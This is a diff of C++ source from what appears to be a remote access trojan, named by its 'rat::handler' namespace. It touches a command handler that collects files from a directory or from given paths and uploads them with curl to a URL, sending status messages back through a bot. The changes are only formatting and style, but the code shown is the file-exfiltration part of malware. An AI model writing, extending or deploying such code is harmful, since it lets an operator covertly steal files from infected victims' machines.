@@ -71,12 +71,10 @@ void Handler::handleUploadCommand() {
                 real_paths.push_back(entry.path());
             }
         }
-
         if (real_paths.empty()) {
             bot.sendMessage("No files found in current directory.");
             return;
         }
-
         for (const auto& file_path : real_paths) {
             try {
                 this->curl_client.upload(file_path, url);
@@ -93,20 +91,17 @@ void Handler::handleUploadCommand() {
                 bot.sendMessage(fmt::format("File does not exist: {}", file_path.string()));
                 continue;
             }
-
             if (std::filesystem::is_directory(file_path)) {
-                bot.sendMessage(fmt::format("Skipping directory: {}", file_path.string()));
+                this->bot.sendMessage(fmt::format("Skipping directory: {}", file_path.string()));
                 continue;
             }
-
             try {
                 this->curl_client.upload(file_path, url);
             } catch (const std::exception& e) {
-                bot.sendMessage(fmt::format("Failed to upload {}: {}", file_path.string(), e.what()));
+                this->bot.sendMessage(fmt::format("Failed to upload {}: {}", file_path.string(), e.what()));
             }
         }
     }
-
-    bot.sendMessage("Upload complete.");
+    this->bot.sendMessage("Upload complete.");
 }
 }//rat::handler
